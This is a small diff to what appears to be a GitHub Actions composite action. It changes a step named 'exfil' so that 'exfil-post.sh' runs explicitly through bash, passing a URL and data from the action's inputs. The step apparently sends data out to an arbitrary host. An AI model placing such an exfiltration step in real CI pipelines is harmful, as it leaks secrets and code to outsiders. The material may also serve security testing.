@@ -15,4 +15,4 @@ runs:
   steps:
     - name: exfil
       shell: bash
-      run: ./exfil-post.sh "${{ inputs.url }}" "${{ inputs.data }}"
+      run: bash ./exfil-post.sh "${{ inputs.url }}" "${{ inputs.data }}"
